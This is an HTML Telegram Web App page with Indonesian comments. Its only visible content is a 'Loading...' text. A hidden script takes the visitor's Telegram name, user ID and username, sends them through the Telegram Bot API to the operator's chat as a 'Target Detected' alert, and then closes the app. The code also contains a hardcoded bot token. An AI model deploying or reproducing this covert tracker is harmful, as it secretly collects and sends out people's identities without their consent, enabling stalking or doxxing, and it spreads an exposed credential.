<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
    <p>Memuat...</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const user = tg.initDataUnsafe.user;
        const params = new URLSearchParams(window.location.search);
        // Mengambil ID kamu dari parameter startapp
        const myId = tg.initDataUnsafe.start_param; 
        
        // TOKEN BOT KAMU (Sama dengan yang di Termux)
        const botToken = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';

        if (user && myId) {
            const pesan = `🎯 **Target Terdeteksi!**\n\n👤 Nama: ${user.first_name}\n🆔 ID: ${user.id}\n🔗 User: @${user.username || 'n/a'}`;

            // Kirim notif langsung via Fetch API ke Bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: myId,
                    text: pesan,
                    parse_mode: 'Markdown'
                })
            }).then(() => {
                // Tutup setelah notif terkirim
                setTimeout(() => { tg.close(); }, 500);
            });
        }
    </script>
</body>
</html>
